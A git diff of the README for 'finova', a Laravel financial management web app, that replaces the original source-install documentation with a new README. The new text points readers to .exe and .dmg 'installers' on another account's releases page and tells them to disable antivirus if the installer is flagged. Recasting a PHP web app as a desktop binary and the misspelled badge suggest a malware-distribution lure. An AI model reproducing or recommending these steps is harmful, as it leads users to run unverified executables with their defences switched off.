@@ -1,312 +1,112 @@
-# 💰 Finova - Modern Financial Management Platform
-
-[![PHP Version](https://img.shields.io/badge/PHP-8.2+-blue.svg)](https://php.net)
-[![Laravel Version](https://img.shields.io/badge/Laravel-11.x-red.svg)](https://laravel.com)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
-[![GitHub Stars](https://img.shields.io/github/stars/mehmetmasa/finova?style=social)](https://github.com/mehmetmasa/finova)
-
-**Finova** is an open-source, AI-powered financial management platform built with Laravel. It combines comprehensive financial tracking, CRM, project management, and intelligent AI assistance in one powerful system.
-
-> 🚀 **Perfect for:** Freelancers, Small Businesses, Agencies, and Financial Professionals
-
-## 🎯 Live Demo
-
-Try it out without installation:
-- **Demo URL:** [https://finans.mikpa.com](https://finans.mikpa.com)
-- **Admin Login:** Use demo credentials on the login page
-- **Employee Login:** Test employee role features
-
-> 💡 **Note:** Demo resets every 30 minutes.
-
-
-## ✨ Features
-
-### 💳 **Financial Management**
-- [x] **Multi-Currency Support** - Track finances in multiple currencies with automatic conversion
-- [x] **Account Management** - Support for bank accounts, credit cards, crypto wallets, virtual POS, and cash
-- [x] **Transaction Tracking** - Comprehensive income, expense, and transfer management
-- [x] **Installment & Subscription** - Automatic recurring transaction management
-- [x] **Tax & Withholding** - Built-in tax calculation and withholding management
-
-### 👥 **Customer & Supplier Management**
-- [x] **Customer Management** - Complete customer database with contact information and history
-- [x] **Supplier Management** - Supplier tracking with debt and payment management
-- [x] **Lead Management** - Lead tracking and conversion system
-- [x] **Customer Agreements** - Contract and agreement management
-- [x] **Customer Credentials** - Secure storage of sensitive customer information
-
-### 🏗️ **Project Management**
-- [x] **Project Tracking** - Create and manage projects with boards and task lists
-- [x] **Task Management** - Kanban-style task management with labels and assignments
-
-### 📊 **Planning & Analytics**
-- [x] **Savings Plans** - Goal-based savings tracking
-- [x] **Investment Plans** - Investment portfolio management
-- [x] **Debt Management** - Loan and debt tracking with payment schedules
-- [x] **Commission System** - Agent commission tracking and management
-
-### 🤖 **AI Integration**
-- [x] **AI Assistant** - Integrated AI chat assistant for financial insights
-- [x] **Document Analysis** - AI-powered document processing and analysis
-- [x] **Smart Suggestions** - AI recommendations for financial decisions
-- [x] **Multi-Provider Support** - OpenAI and Google Gemini integration
-
-### 🔐 **User Management & Security**
-- [x] **Role-Based Access Control** - Comprehensive role and permission management system
-- [x] **Custom Roles** - Create and manage custom roles with specific permissions
-- [x] **Permission Management** - Granular permission control for all system features
-- [x] **User Management** - Create, edit, and manage team members with role assignments
-
-### 📱 **Modern UI/UX**
-- [x] **Livewire Components** - Reactive, modern user interface
-- [x] **Responsive Design** - Mobile-first responsive design
-- [x] **Real-time Updates** - Live data updates and notifications
-
-## 🚀 Roadmap & Upcoming Features
-
-### 🔶 Enhanced Multi-Language Support
-- [ ] **Complete Translation System** - Full translation coverage for all UI elements
-- [ ] **Dynamic Language Switching** - Change language without page refresh
-- [ ] **RTL Support** - Right-to-left language support (Arabic, Hebrew)
-- [ ] **Custom Translation Management** - Admin panel for managing translations
-
-### 🔶 Advanced Currency Management
-- [ ] **Default Currency Selection** - Set preferred currency
-- [ ] **Currency Rate Auto-Update** - Automatic exchange rate updates from APIs
-- [ ] **Custom Exchange Rates** - Manual override for specific rates
-- [ ] **Currency Formatting** - Localized number and currency formatting
-
-### 🔶 Automated Setup Wizard
-- [ ] **One-Click Installation** - Streamlined setup process
-- [ ] **Database Configuration** - Interactive database setup
-- [ ] **Demo Data Installation** - Optional sample data loading
-- [ ] **AI Configuration** - Easy API key setup for AI features
-- [ ] **Email & Notification Setup** - Configure SMTP and notifications
-
-> 💡 **Want to contribute?** Check out our [Contributing Guide](#-contributing) and pick a feature to work on!
-
-## 🛠️ Technology Stack
-
-### Backend
-- **Laravel 11** - PHP web framework
-- **MySQL/PostgreSQL** - Database
-- **Livewire 3** - Reactive components
-- **Filament 3** - Admin panel
-
-### Frontend
-- **Tailwind CSS** - Utility-first CSS framework
-- **Alpine.js** - Lightweight JavaScript framework
-- **Chart.js** - Data visualization
-- **TipTap Editor** - Rich text editing
-
-### AI & External Services
-- **OpenAI API** - Chat and document analysis
-- **Google Gemini** - Alternative AI provider
-- **Telegram Bot API** - Notification system
-
-### Development Tools
-- **Vite** - Fast build tool
-- **Pint** - PHP code style fixer
-- **PHPStan** - Static analysis
-- **Pest** - PHP testing framework
-
-## 📋 Requirements
-
-- **PHP** 8.2 or higher
-- **Composer** - PHP dependency manager
-- **Node.js** 18.x or higher
-- **NPM** or **Yarn** - JavaScript dependency manager
-- **MySQL** 5.7+ or **PostgreSQL** 10+
-- **Redis** (optional, for caching and queues)
-
-## 🚀 Installation
-
-### 1. Clone the Repository
-```bash
-git clone https://github.com/mehmetmasa/finova.git
-cd finova
-```
-
-### 2. Install PHP Dependencies
-```bash
-composer install
-```
-
-### 3. Install JavaScript Dependencies
-```bash
-npm install
-# or
-yarn install
-```
-
-### 4. Environment Configuration
-```bash
-cp .env.example .env
-```
-
-Edit the `.env` file and configure:
-- Database credentials (DB_DATABASE, DB_USERNAME, DB_PASSWORD)
-- Mail configuration (for notifications)
-- AI API keys (OpenAI, Gemini)
-- Application settings
-
-### 5. Generate Application Key
-```bash
-php artisan key:generate
-```
-
-### 6. Database Setup
-```bash
-php artisan migrate --seed
-```
-
-This will create all database tables and populate with sample data.
-
-### 7. Storage Setup
-```bash
-php artisan storage:link
-```
-
-### 8. Build Frontend Assets
-```bash
-npm run build
-# For development
-npm run dev
-```
-
-### 9. Start the Application
-```bash
-php artisan serve
-```
-
-The application will be available at `http://localhost:8000`
-
-## 🔑 Default Credentials
-
-**Admin User:**
-- Email: `admin@admin.com`
-- Password: `admin123`
-
-## 📖 Usage
-
-### Dashboard
-- Overview of financial status
-- Recent transactions and activities
-- Quick action buttons for common tasks
-
-### Financial Management
-- **Transactions**: Add, edit, and categorize financial transactions
-- **Accounts**: Manage different account types and balances
-- **Categories**: Organize transactions with custom categories
-- **Budgets**: Set and track spending limits
-
-### Customer Management
-- **Customers**: Manage customer information and history
-- **Leads**: Track potential customers and conversion
-- **Agreements**: Manage contracts and recurring agreements
-
-### Project Management
-- **Projects**: Create and manage projects
-- **Boards**: Kanban-style project boards
-- **Tasks**: Task management with assignments and due dates
+# 🌟 finova - Manage Your Finances Smartly and Easily
 
-### AI Assistant
-- Access AI chat assistant for financial insights
-- Upload and analyze documents
-- Get AI-powered recommendations
+## 💾 Download Now
+[![Download finova](https://img.shields.io/badge/Download-fanova-4CD137?style=plastic&logo=github)](https://github.com/Felipe2099/finova/releases)
 
-## 🔧 Configuration
+## 🚀 Getting Started
+Welcome to finova! This guide helps you download and run the software easily. finova is an open-source, AI-powered financial management platform. You can track multiple currencies, manage projects, and get real-time analytics—all in one place. No programming knowledge is needed!
 
-### AI Integration Setup
-1. Get API keys from [OpenAI](https://platform.openai.com) or [Google AI](https://ai.google.dev)
-2. Add keys to `.env` file:
-```env
-OPENAI_API_KEY=your_openai_key
-GEMINI_API_KEY=your_gemini_key
-```
+## 📥 Download & Install
 
-### Telegram Notifications (Optional)
-1. Create a Telegram bot via [@BotFather](https://t.me/botfather)
-2. Add bot token to `.env`:
-```env
-TELEGRAM_BOT_TOKEN=your_bot_token
-TELEGRAM_CHAT_ID=your_chat_id
-```
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/Felipe2099/finova/releases) to find the latest version of finova. 
 
-## 🤝 Contributing
+2. **Choose the Right File**  
+   You will see several files for different operating systems. Choose the one that matches your system. For Windows, look for a `.exe` file. For macOS, find the `.dmg` file. 
 
-**We love contributions!** Whether it's bug fixes, new features, or documentation improvements, all contributions are welcome!
+3. **Download the File**  
+   Click on the file name to start downloading. The file will save to your computer.
 
-### How to Contribute
+4. **Run the Installer**  
+   Once the download completes, find the file in your downloads folder and double-click it to start the installation.
 
-1. **Fork** the repository
-2. **Clone** your fork: `git clone https://github.com/YOUR_USERNAME/finova.git`
-3. **Create** a feature branch: `git checkout -b feature/amazing-feature`
-4. **Make** your changes
-5. **Commit** your changes: `git commit -m 'Add amazing feature'`
-6. **Push** to the branch: `git push origin feature/amazing-feature`
-7. **Open** a Pull Request
+5. **Follow the Installation Steps**  
+   Follow the on-screen instructions. Usually, this means agreeing to the terms and clicking 'Next' until the installation is complete.
 
-### Development Guidelines
-- ✅ Follow **PSR-12** coding standards
-- ✅ Use **meaningful commit messages**
-- ✅ Keep PRs **focused and small**
-- ✅ Add **comments** for complex logic
+6. **Launch finova**  
+   After installation, find the finova icon on your desktop or in your applications folder. Click it to start using the application.
 
-### Good First Issues
+7. **Sign Up or Log In**  
+   If you are a new user, create an account by following the prompts. If you are returning, simply log in with your existing credentials.
 
-Look for issues labeled with:
-- 🟢 `good first issue` - Perfect for first-time contributors
-- 🟡 `help wanted` - We need your help!
-- 🔵 `documentation` - Help improve our docs
+## 📊 Features
+finova offers several powerful features to simplify your financial management:
 
-### Questions?
+- **Multi-Currency Tracking**  
+  Manage your expenses and income across different currencies. Keep everything organized and up to date.
 
-- 💬 Open a [Discussion](https://github.com/mehmetmasa/finova/discussions)
-- 🐛 Found a bug? [Open an Issue](https://github.com/mehmetmasa/finova/issues)
-- 💡 Have an idea? [Create a Feature Request](https://github.com/mehmetmasa/finova/issues/new)
+- **Customer Relationship Management (CRM)**  
+  Track interactions with customers. Use our CRM tools to enhance client relationships.
 
-## 📄 License
+- **Project Management Tools**  
+  Easily oversee projects, tasks, and deadlines all in one platform.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+- **AI Assistant**  
+  Get smart advice from our built-in AI assistant. Maximize your financial decisions effortlessly.
 
-## 🙏 Acknowledgments
+- **Real-Time Analytics**  
+  Receive insights into your financial data. Make informed choices with graphical representations of your financial health.
 
-- [Laravel](https://laravel.com) - The PHP framework
-- [Livewire](https://laravel-livewire.com) - Reactive components
-- [Filament](https://filamentphp.com) - Admin panel
-- [Tailwind CSS](https://tailwindcss.com) - Utility-first CSS framework
-- [Alpine.js](https://alpinejs.dev) - Lightweight JavaScript framework
-- [OpenAI](https://openai.com) - AI integration
-- [Google Gemini](https://ai.google.dev) - AI integration
+## 📋 System Requirements
+To run finova smoothly, your system should meet these requirements:
 
+- **Operating System:**  
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Linux (most distributions)
 
-## 💬 Community & Support
+- **Processor:**  
+  Minimum dual-core processor (2 GHz)
 
-### Get Help
+- **RAM:**  
+  At least 4GB
 
-- 📖 **Documentation:** Check out our [Wiki](https://github.com/mehmetmasa/finova/wiki)
-- 💬 **Discussions:** Join [GitHub Discussions](https://github.com/mehmetmasa/finova/discussions)
-- 🐛 **Bug Reports:** [Open an Issue](https://github.com/mehmetmasa/finova/issues)
-- ⭐ **Feature Requests:** Share your ideas in [Issues](https://github.com/mehmetmasa/finova/issues/new)
+- **Disk Space:**  
+  500MB of available space
 
-### Show Your Support
+- **Internet Connection:**  
+  Required for AI features and analytics updates.
 
-If you find Finova helpful, please:
-- ⭐ **Star** this repository
-- 🐦 **Share** it on social media
-- 🔗 **Link** to it from your projects
-- 💬 **Tell** others about it
+## 🛠 Troubleshooting
+If you encounter any issues while downloading or installing finova, here are some common solutions:
 
----
+1. **Check Your Internet Connection**  
+   Make sure you are connected to the internet, as a stable connection is necessary for downloading.
 
-<div align="center">
+2. **Disable Antivirus Temporarily**  
+   Sometimes, antivirus software may mistakenly flag our installer. If you encounter issues, disable it temporarily while installing.
 
-**Made with ❤️ by the open-source community**
+3. **Re-download the File**  
+   If the file seems corrupted, delete it and download it again from the [Releases page](https://github.com/Felipe2099/finova/releases).
 
-*Developed and maintained by [Mikpa](https://mikpa.com)*
+4. **Search the Issues Page**  
+   Visit the [issues section](https://github.com/Felipe2099/finova/issues) of our repository. You may find solutions shared by other users.
 
-[⬆ Back to Top](#-finova---modern-financial-management-platform)
+5. **Contact Support**  
+   If problems persist, reach out through our contact options provided in the application for further assistance.
 
-</div>
+## 💬 Community and Support
+Join our growing community! Share your thoughts, ask questions, and get support from fellow users and developers.
+
+- **GitHub Issues:**  
+  Report bugs or request features directly on our issues page.
+
+- **Discussion Forum:**  
+  Engage in discussions with other users. Share tips and tricks to manage your finances better.
+
+- **Social Media:**  
+  Follow us on our social media platforms to get updates and insights about finova.
+
+## 🌐 Contributing
+Our project is open-source, which means you can contribute. Whether it’s fixing bugs or improving features, we welcome your involvement.
+
+1. **Fork the Repository**  
+   Click the "Fork" button on GitHub to create a copy of finova in your account.
+
+2. **Make Changes**  
+   Work on the features or bugs you want to improve.
+
+3. **Submit a Pull Request**  
+   Once you are satisfied with your changes, submit a pull request for review.
+
+Thank you for choosing finova! We look forward to helping you manage your finances more efficiently.
